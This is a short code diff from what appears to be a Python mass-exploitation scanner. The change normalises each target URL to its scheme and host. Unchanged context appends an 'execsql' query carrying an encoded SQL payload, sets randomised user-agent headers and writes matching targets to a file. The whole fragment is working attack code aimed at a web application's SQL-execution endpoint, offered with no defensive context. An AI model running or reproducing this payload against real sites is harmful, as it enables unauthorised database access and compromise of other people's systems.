@@ -33,6 +33,8 @@ def wirte_targets(vurl, filename):
 		f.write(vurl + "\n")
 
 def check_url(url):
+	url=parse.urlparse(url)
+	url='{}://{}'.format(url[0],url[1])
 	url=url + "/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5"
 	headers = {
 		'User-Agent': get_ua(),
